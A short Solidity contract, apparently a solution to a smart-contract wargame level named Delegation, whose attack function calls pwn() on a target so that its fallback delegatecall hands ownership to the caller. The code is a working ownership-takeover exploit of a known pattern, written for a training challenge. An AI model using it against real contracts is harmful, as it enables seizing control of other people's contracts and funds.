// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IDelegation { // 1) change interface name
    function owner() external view returns (address);
}

contract DelegationAttack { // 2) change nameattck

    constructor() {

    }
    function attack(address target) public {

        (bool success,) = target.call(abi.encodeWithSignature("pwn()"));

        require(success, "call failed");
    }
}